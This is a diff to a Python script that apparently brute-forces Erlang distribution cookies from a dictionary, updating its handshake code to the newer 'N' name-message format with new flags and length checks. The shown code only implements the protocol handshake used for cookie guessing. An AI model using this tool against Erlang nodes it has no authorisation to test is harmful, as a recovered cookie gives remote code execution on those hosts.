@@ -23,7 +23,11 @@ parser.add_argument('dictionary', action='store', type=str, help='Dictionary of 
 parser.add_argument('--delay', type=float, default=0.0, help='Amount of seconds (float) to sleep between attempts')
 
 def send_name(name):
-  return pack('!HcHI', 7 + len(name), 'n', 5, 0x7499c) + name
+  FLAGS = (
+    0x7499c +
+    0x01000600 # HANDSHAKE_23 | BIT_BINARIES | EXPORT_PTR_TAG
+  )
+  return pack('!HcQIH', 15 + len(name), 'N', FLAGS, 0xdeadbeef, len(name)) + name
 
 def send_challenge_reply(cookie, challenge):
   m = md5()
@@ -44,10 +48,12 @@ def does_cookie_authenticate(cookie):
   sock.sendall(send_name(name))
 
   data = sock.recv(5)
-  assert(data == '\x00\x03\x73\x6f\x6b')
+  assert(data == '\x00\x03\x73ok')
 
   data = sock.recv(4096)
-  (length, tag, version, flags, challenge) = unpack('!HcHII', data[:13])
+  (length, tag, flags, challenge, creation, nlen) = unpack('!HcQIIH', data[:21])
+  assert(tag == 'N')
+  assert(nlen + 19 == length)
   challenge = '%u' % challenge
 
   sock.sendall(send_challenge_reply(cookie, challenge))
